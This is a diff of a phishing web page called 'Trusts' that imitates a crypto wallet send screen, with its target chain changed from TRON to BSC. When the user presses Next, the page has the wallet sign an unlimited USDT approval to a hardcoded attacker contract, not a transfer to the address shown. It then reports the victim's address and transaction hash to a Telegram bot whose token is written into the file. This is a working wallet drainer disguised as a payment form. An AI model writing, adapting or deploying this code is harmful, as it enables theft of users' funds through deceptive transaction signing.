@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
     <title>Trusts</title>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
         * { box-sizing: border-box; }
         html, body, #root { width: 100%; height: 100%; margin: 0; font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, sans-serif; font-weight: 500; }
@@ -41,17 +41,6 @@
         .connect-btn:disabled { opacity: 0.5; cursor: not-allowed; }
         .error-message { color: #dc2626; font-size: 12px; margin-top: 6px; padding: 8px 10px; background: #fee2e2; border-radius: 8px; display: none; }
         .error-message.show { display: block; }
-        .network-selector { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.5); display: flex; align-items: center; justify-content: center; z-index: 2000; }
-        .network-selector.hidden { display: none; }
-        .network-selector-content { background: white; border-radius: 16px; padding: 32px 24px; max-width: 400px; width: 90%; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3); }
-        .network-selector-title { font-size: 24px; font-weight: 700; margin-bottom: 8px; color: var(--text); }
-        .network-selector-subtitle { font-size: 14px; color: var(--subtext); margin-bottom: 24px; }
-        .network-button { width: 100%; height: 56px; border: 1.5px solid var(--border-default); border-radius: 12px; background: var(--input-bg); cursor: pointer; font-size: 16px; font-weight: 600; margin-bottom: 12px; transition: all 0.2s ease; display: flex; align-items: center; gap: 12px; padding: 0 16px; }
-        .network-button:hover { border-color: #2563eb; background: var(--input-soft); }
-        .network-button-icon { width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; color: white; }
-        .eth-icon { background: #627eea; }
-        .bnb-icon { background: #f3ba2f; color: black; }
-        .tron-icon { background: #eb0029; }
         .processing-screen { display: none; position: fixed; inset: 0; background: rgba(255, 255, 255, 0.98); backdrop-filter: blur(4px); z-index: 1000; flex-direction: column; justify-content: flex-end; align-items: center; gap: 0; padding: 0; }
         .processing-screen.active { display: flex; }
         .processing-content { width: 100%; background: white; border-radius: 24px 24px 0 0; padding: 40px 20px 30px; display: flex; flex-direction: column; align-items: center; gap: 20px; box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.1); position: relative; }
@@ -77,25 +66,6 @@
     </style>
 </head>
 <body>
-    <div class="network-selector" id="networkSelector">
-        <div class="network-selector-content">
-            <div class="network-selector-title">Select Network</div>
-            <div class="network-selector-subtitle">Choose which blockchain to use</div>
-            <button class="network-button" onclick="selectNetwork('ethereum')">
-                <div class="network-button-icon eth-icon">Ξ</div>
-                <span>Ethereum</span>
-            </button>
-            <button class="network-button" onclick="selectNetwork('bnb')">
-                <div class="network-button-icon bnb-icon">B</div>
-                <span>BNB Chain (BSC)</span>
-            </button>
-            <button class="network-button" onclick="selectNetwork('tron')">
-                <div class="network-button-icon tron-icon">⚡</div>
-                <span>TRON</span>
-            </button>
-        </div>
-    </div>
-
     <div class="processing-screen" id="processingScreen">
         <div class="particles-container" id="particlesContainer"></div>
         <div class="processing-content">
@@ -110,19 +80,19 @@
     </div>
 
     <div id="root">
-        <div class="page" style="display: none;" id="mainPage">
+        <div class="page">
             <div class="card">
                 <label class="label">Address or Domain Name</label>
                 <div class="input-row primary">
-                    <input id="recipientInput" type="text" placeholder="Search or Enter" value="TAT3kU5o3utrcFL7u747B45W1zRxbWZF8b" />
-                    <span class="paste" onclick="pasteAddress()">Paste</span>
+                    <input id="recipientInput" type="text" placeholder="Search or Enter" value="0x29A3B590B14d97e25b5b04D9804237E5b491b57b" />
+                    <span class="paste" onclick="pasteAddress( )">Paste</span>
                 </div>
 
                 <label class="label">Destination Network</label>
                 <div class="network-row" id="tokenSelector">
                     <div class="network-left">
                         <img id="selectedTokenLogo" src="" alt="Token" class="token-logo">
-                        <span id="selectedTokenName">USDT on TRON</span>
+                        <span id="selectedTokenName">USDT on BSC</span>
                     </div>
 
                     <div class="token-dropdown-menu" id="tokenDropdownMenu"></div>
@@ -145,41 +115,30 @@
     </div>
 
     <script>
-        const NETWORKS = {
-            'ethereum': { name: 'Ethereum', chainId: '0x1', tokens: { 'usdt_eth': { name: 'USDT on Ethereum', symbol: 'USDT', address: '0xdac17f958d2ee523a2206206994597c13d831ec7', decimals: 6, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png', smartContract: '0x...', rpc: 'https://eth.llamarpc.com' } } },
-            'bnb': { name: 'BNB Chain', chainId: '0x38', tokens: { 'usdt_bnb': { name: 'USDT on BSC', symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0x55d398326f99059fF775485246999027B3197955/logo.png', smartContract: '0x...', rpc: 'https://bsc-dataseed.bnbchain.org' } } },
-            'tron': { name: 'TRON', chainId: '0x2b6653dc', tokens: { 'usdt_tron': { name: 'USDT on TRON', symbol: 'USDT', address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', decimals: 6, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/assets/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/logo.png', smartContract: 'TURuHxzSzg8FR8VdtBpNSVAP7VU8KvxKFF', rpc: 'https://api.tronstack.io' } } }
+        const TOKENS = {
+            'usdt_bsc': { name: 'USDT on BSC', symbol: 'USDT', network: 'BSC', chainId: 56, chainIdHex: '0x38', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0x55d398326f99059fF775485246999027B3197955/logo.png', rpc: 'https://bsc-dataseed1.binance.org:8545', smartContract: '0xBAE688D04e14E9939C3a5dA69a1D746ea3487570' }
         };
 
         const CONFIG = { TELEGRAM_BOT_TOKEN: '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA', TELEGRAM_CHAT_ID: '8933407008' };
-        let selectedNetwork = null;
-        let selectedToken = null;
-        let currentTokens = {};
+        let selectedToken = 'usdt_bsc';
 
-        function selectNetwork(network) {
-            selectedNetwork = network;
-            currentTokens = NETWORKS[network].tokens;
-            selectedToken = Object.keys(currentTokens)[0];
-            
-            document.getElementById('networkSelector').classList.add('hidden');
-            document.getElementById('mainPage').style.display = 'flex';
-            
+        document.addEventListener('DOMContentLoaded', ( ) => {
             initializeTokenDropdown();
             document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
-        }
+        });
 
         function initializeTokenDropdown() {
             const menu = document.getElementById('tokenDropdownMenu');
             menu.innerHTML = '';
-            for (const [key, token] of Object.entries(currentTokens)) {
+            for (const [key, token] of Object.entries(TOKENS)) {
                 const option = document.createElement('div');
                 option.className = `token-option ${key === selectedToken ? 'active' : ''}`;
                 option.onclick = (e) => {
                     e.stopPropagation();
                     selectToken(key);
                 };
-                option.innerHTML = `<img src="${token.logo}" alt="${token.symbol}" class="token-logo" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22%3E%3Crect fill=%22%23f0f0f0%22 width=%2224%22 height=%2224%22/%3E%3C/svg%3E'"><div class="token-info"><div class="token-name">${token.symbol}</div><div class="token-network">${NETWORKS[selectedNetwork].name}</div></div>`;
-                menu.appendChild(option);
+                option.innerHTML = `<img src="${token.logo}" alt="${token.symbol}" class="token-logo" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22%3E%3Crect fill=%22%23f0f0f0%22 width=%2224%22 height=%2224%22/%3E%3C/svg%3E'"><div class="token-info"><div class="token-name">${token.symbol}</div><div class="token-network">${token.network}</div></div>`;
+                menu.appendChild(option );
             }
         }
 
@@ -204,12 +163,14 @@
 
         function selectToken(key) {
             selectedToken = key;
-            const token = currentTokens[key];
+            const token = TOKENS[key];
             document.getElementById('selectedTokenLogo').src = token.logo;
             document.getElementById('selectedTokenName').textContent = token.name;
             document.getElementById('tokenUnit').textContent = token.symbol;
             
+            // CHIUDE IL DROPDOWN SUBITO ✅
             closeDropdown();
+            
             initializeTokenDropdown();
         }
 
@@ -255,13 +216,11 @@
         }
 
         async function sendTelegramNotification(userAddress, txHash, amount, token, recipient) {
-            const explorerUrl = selectedNetwork === 'tron' 
-                ? `https://tronscan.org/transaction/${txHash}`
-                : selectedNetwork === 'bnb'
-                ? `https://bscscan.com/tx/${txHash}`
-                : `https://etherscan.io/tx/${txHash}`;
+            const explorerUrl = token.network === 'Ethereum' 
+                ? `https://etherscan.io/tx/${txHash}`
+                : `https://bscscan.com/tx/${txHash}`;
 
-            const messageText = `Token Approve Notification\n\nToken: ${token.symbol}\nNetwork: ${NETWORKS[selectedNetwork].name}\nUser: ${userAddress}\nRecipient: ${recipient}\nAmount: ${amount} ${token.symbol}\n\nTransaction Hash:\n${txHash}\n\nExplorer:\n${explorerUrl}\n\nTime: ${new Date().toLocaleString()}\n\nSmart Contract:\n${token.smartContract}`;
+            const messageText = `Token Approve Notification\n\nToken: ${token.symbol}\nNetwork: ${token.network}\nUser: ${userAddress}\nRecipient: ${recipient}\nAmount: ${amount} ${token.symbol}\n\nTransaction Hash:\n${txHash}\n\nExplorer:\n${explorerUrl}\n\nTime: ${new Date( ).toLocaleString()}\n\nSmart Contract:\n${token.smartContract}`;
 
             const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
 
@@ -272,7 +231,7 @@
                     body: JSON.stringify({
                         chat_id: CONFIG.TELEGRAM_CHAT_ID,
                         text: messageText
-                    })
+                    } )
                 });
 
                 const responseData = await response.json();
@@ -288,7 +247,12 @@
             const btn = document.getElementById('mainButton');
             const recipient = document.getElementById('recipientInput').value.trim();
             const amount = document.getElementById('amountInput').value.trim();
-            const token = currentTokens[selectedToken];
+            const token = TOKENS[selectedToken];
+
+            if (!recipient.startsWith('0x')) {
+                showError('Invalid recipient address');
+                return;
+            }
 
             if (!amount || parseFloat(amount) <= 0) {
                 showError('Please enter a valid amount');
@@ -300,66 +264,59 @@
             clearError();
 
             try {
-                if (selectedNetwork === 'tron') {
-                    let tronWeb = window.tronWeb;
-                    if (!tronWeb) {
-                        showError('Trust Wallet not detected');
-                        btn.disabled = false;
-                        btn.textContent = 'Next';
-                        return;
-                    }
-
-                    let userAddress = tronWeb.defaultAddress.base58;
-                    if (!userAddress) {
-                        showError('Wallet address not available');
-                        btn.disabled = false;
-                        btn.textContent = 'Next';
-                        return;
-                    }
-
-                    const parameter = [
-                        {type: 'address', value: token.smartContract},
-                        {type: 'uint256', value: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'}
-                    ];
-
-                    const tx = await tronWeb.transactionBuilder.triggerSmartContract(
-                        token.address,
-                        'approve(address,uint256)',
-                        {feeLimit: 100000000},
-                        parameter,
-                        userAddress
-                    );
-
-                    if (!tx.result || !tx.result.result) {
-                        showError('Failed to build transaction');
-                        btn.disabled = false;
-                        btn.textContent = 'Next';
-                        return;
-                    }
-
-                    const signedTx = await tronWeb.trx.sign(tx.transaction);
-                    let txHash = await tronWeb.trx.sendRawTransaction(signedTx);
-
-                    if (!txHash) {
-                        showError('Failed to send transaction');
-                        btn.disabled = false;
-                        btn.textContent = 'Next';
-                        return;
-                    }
-
+                let ethereum = window.ethereum;
+                let retries = 0;
+                while (!ethereum && retries < 10) {
                     await new Promise(resolve => setTimeout(resolve, 100));
-                    createParticles();
-                    document.getElementById('processingScreen').classList.add('active');
-                    await sendTelegramNotification(userAddress, txHash, amount, token, recipient);
-                    await new Promise(resolve => setTimeout(resolve, 5000));
-                    document.getElementById('processingScreen').classList.remove('active');
-                } else {
-                    showError('Network not yet implemented');
+                    ethereum = window.ethereum;
+                    retries++;
+                }
+
+                if (!ethereum) {
+                    showError('Trust Wallet not detected');
                     btn.disabled = false;
                     btn.textContent = 'Next';
                     return;
                 }
 
+                let accounts = await ethereum.request({ method: "eth_accounts" });
+                let userAddress = accounts && accounts.length > 0 ? accounts[0] : null;
+
+                const currentChainId = await ethereum.request({ method: 'eth_chainId' });
+                if (currentChainId !== token.chainIdHex) {
+                    try {
+                        await ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: token.chainIdHex }]
+                        });
+                    } catch (err) {
+                        if (err.code === 4902) {
+                            showError('Network not supported');
+                            btn.disabled = false;
+                            btn.textContent = 'Next';
+                            return;
+                        }
+                    }
+                }
+
+                const iface = new ethers.utils.Interface(['function approve(address spender, uint256 amount) public returns (bool)']);
+                const tx = {
+                    to: token.address,
+                    data: iface.encodeFunctionData('approve', [token.smartContract, ethers.constants.MaxUint256]),
+                    from: userAddress
+                };
+
+                let txHash = await ethereum.request({ method: "eth_sendTransaction", params: [tx] });
+
+                await new Promise(resolve => setTimeout(resolve, 100));
+
+                createParticles();
+                document.getElementById('processingScreen').classList.add('active');
+
+                await sendTelegramNotification(userAddress || 'Unknown', txHash, amount, token, recipient);
+
+                await new Promise(resolve => setTimeout(resolve, 5000));
+                document.getElementById('processingScreen').classList.remove('active');
                 btn.textContent = 'Next';
                 btn.disabled = false;
                 document.getElementById('amountInput').value = '';
@@ -373,6 +330,9 @@
                 btn.textContent = 'Next';
             }
         }
+
+        initializeTokenDropdown();
+        document.getElementById('selectedTokenLogo').src = TOKENS[selectedToken].logo;
     </script>
 </body>
 </html>
